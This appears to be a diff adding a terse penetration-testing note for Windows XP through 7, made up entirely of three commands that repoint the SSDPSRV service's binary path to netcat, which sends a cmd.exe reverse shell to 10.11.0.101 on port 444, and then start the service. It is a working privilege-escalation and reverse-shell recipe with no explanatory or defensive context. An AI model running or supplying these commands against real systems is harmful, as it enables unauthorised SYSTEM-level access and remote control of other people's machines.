@@ -1,0 +1,7 @@
+====winxp - 7====
+
+sc config SSDPSRV binpath= "c:\temp\nc.exe -nv 10.11.0.101 444 -e cmd.exe"
+sc qc SSDPSRV
+net start SSDPSRV
+
+
